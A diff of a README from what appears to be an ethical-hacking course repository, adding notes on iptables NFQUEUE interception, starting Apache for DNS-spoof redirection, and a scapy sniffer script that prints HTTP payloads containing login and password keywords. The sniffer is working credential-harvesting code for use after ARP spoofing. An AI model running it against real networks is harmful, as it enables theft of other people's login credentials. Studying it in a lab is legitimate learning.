@@ -4,9 +4,10 @@
 
 ### Useful command used along the course
 
-*****ADD COMMENT ABOUT WHAT IT DOES******
+`ifconfig` is used to display and manage information about network interfaces (both physical and virtual) on your system.
 
-```sh ifconfig
+```sh
+    ifconfig
 ```
 
 ### Common methods use to check object and variables, we are usig scapy as example:
@@ -230,8 +231,7 @@ For python 3 print statement we would set it as below and we don't need flush()
 ```python
     print("\r[+] Packets sent: " +str(packets_sent_count), end="")
 ```
-
- **Packet snifer**
+## [Packet snifer](packet_snifer.py):
 
  - This tool allowed us to capture data flowing through an interface, data that we got with our ARP spofing tool, filter the data
   and display interesting information (Login info such as username and passwords, visited websites, images, urls,...)
@@ -267,10 +267,16 @@ Second we have to create a queue for the the "INPUT" chain, this is the chain pa
     iptables -I INPUT -j NFQUEUE --queue-num 357
 ```
 
-Once we finish is important to run the command below to set the tables as they were:
+Once we finish testing and we want to make an attack to another system we have to run:
 
 ```sh
     iptables --flush
+```
+
+and, for reasons explain before, run:
+
+```sh
+    iptables -I FORDWARD -J NFQUEUE --queue-num 125
 ```
 
 **Remember use the same --queue-num in the queue.bind statement in the script**
@@ -291,7 +297,49 @@ When we finish with the attack we have to make sure we delete the IP table we cr
     iptables --flush
 ```
 
-2. Create a DNS spoof.
+1.c Run web server.
+
+In kali, by default, we have installed an Apache web service so to run it, and get an IP that we can use to redirect the target we just have to run the
+command below. We are going to use the same IP locally and in the real attack to other systems, at least in our case:
+
+```sh
+    service apache2 start
+```
+
+If Apache run successfully we won't see any response, but we can see the server values running `netstat -tuln`. The expected result would be:
+
+![route command response](img/apache_start_flow.png)
+
+**When we see :::80 in a server configuration, it means that the server is configured to listen on all available IPv6 addresses on port 80.
+This allows the server to accept incoming HTTP requests on any IPv6 interface it has.**
+
+2. Script explanation:
+
+```python
+    def sniff(interface):
+    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
+    # iface set the interface we are going to sniff on
+    # store Tell scapy not to store packets in memory so no pressure in our computer
+    # prn here we can call a function each time the function catch a package (data)
+    # filter Would Allows us to filter packets using Berkeley packet filter syntax (BPF) check https://biot.com/capstats/bpf.html
+
+def process_sniffed_packet(packet):
+    # Check if the packet has a HTTPRequest layer, URLs, imges, videos, passwords, are sent using HTTPRequest layer
+    if packet.haslayer(http.HTTPRequest): # We use http.HTTPRequest because scapy doesn't have a http filter by default
+        if packet.haslayer(scapy.Raw): # Command to chech if the packet has a specific layer. We saw, when running the script, that the useful info is in the 'raw' layer
+            load = packet[scapy.Raw].load # packet (packet name)  [scapy.Raw](layer we are interested in PRINTING) .load(To print a specific field within the layer)
+            load_str = load.decode() # Convert bytes to string using UTF-8 encoding, to avoid "TypeError: a bytes-like object is required, not 'str'" error
+            keywords = ["username", "user", "login", "password", "pass"] #Possible keywords in the load field
+            for keyword in keywords:
+                if keyword in load_str:
+                    print(load)
+                    break # To print load field value at most one, in case more than one keyword is in load layer
+            #print(packet.show()) # .show() To know which layer contains the info we are looking for
+
+sniff("eth0")
+```
+
+## [DNS spoof](dns_spoof.py):
 
 What a DNS is?
 
@@ -351,7 +399,7 @@ as in answer:
 
 ![DNS layer to modify](img/DNS_layer_to_modify.png)
 
-3. Modify packets before forwarding them to their destination.
+1. Modify packets before forwarding them to their destination.
 
 Some response fields introduction:
 
@@ -382,3 +430,6 @@ Some response fields introduction:
                 packet.set_payload(str(scapy_packet))
         packet.accept()
 ```
+**Steps to run the DNS spoof**
+
+1.
